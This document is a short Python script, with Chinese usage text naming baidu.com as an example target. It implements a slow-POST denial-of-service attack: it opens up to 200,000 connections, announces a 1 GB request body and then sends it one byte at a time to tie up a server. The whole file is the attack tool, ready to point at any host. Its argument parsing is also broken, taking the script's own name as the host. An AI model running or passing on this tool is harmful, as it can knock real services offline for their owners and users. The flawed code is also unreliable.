# coding: utf8
import socket
import time
import threading
import sys

print("""请输入域名或IP，端口默认80( https 可输入443 )\n例:\tbaidu.com 443\n\tbaidu.com\n请勿加 http://""")
argv = sys.argv
if len(argv) == 2:
    host = argv[-2]
    if len(argv) == 3:
        port = argv[-1]
    else:
        port = 80
else:
    raise ValueError('缺少域名/IP参数')

MAX_CONN = 200000
PORT = port
HOST = host
if HOST[-1] == '/':
    HOST = HOST[:-1]
PAGE = "/"
# ---------------------------
buf = ("POST %s HTTP/1.1\r\n"
       "Host: %s\r\n"
       "Content-Length: 1000000000\r\n"
       "Cookie: dklkt_dos_test\r\n"
       "\r\n" % (PAGE, HOST))
socks = []

print(HOST, PORT)


def conn_thread():
    global socks
    for i in range(0, MAX_CONN):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            s.connect((HOST, PORT))
            s.send(buf.encode('utf8'))
            socks.append(s)
        except Exception as ex:
            print("[-] Could not connect to server or send error:%s" % ex)
            time.sleep(3)


def send_thread():
    global socks
    while True:
        for s in socks:
            try:
                s.send(b"f")
            except Exception as ex:
                socks.remove(s)
                s.close()


conn_th = threading.Thread(target=conn_thread, args=())
send_th = threading.Thread(target=send_thread, args=())
conn_th.start()
send_th.start()
